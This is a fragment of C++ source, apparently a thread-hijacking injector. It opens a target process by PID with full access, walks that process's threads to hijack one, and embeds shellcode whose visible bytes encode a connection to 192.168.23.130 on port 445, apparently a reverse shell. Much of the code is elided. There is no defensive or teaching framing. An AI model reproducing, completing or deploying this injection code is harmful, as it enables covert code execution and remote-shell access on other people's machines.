// ThreadHijacking.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
...
int main(int argc, char* argv[])
{
	...
	unsigned char shellcode[] =
		...
		"\x89\xe5\x49\xbc\x02\x00\x01\xbd\xc0\xa8\x17\x82\x41\x54"
	...
	CONTEXT context;
     ...
     targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
     ...
     {
		if (threadEntry.th32OwnerProcessID == DWORD(atoi(argv[1])))
	     {
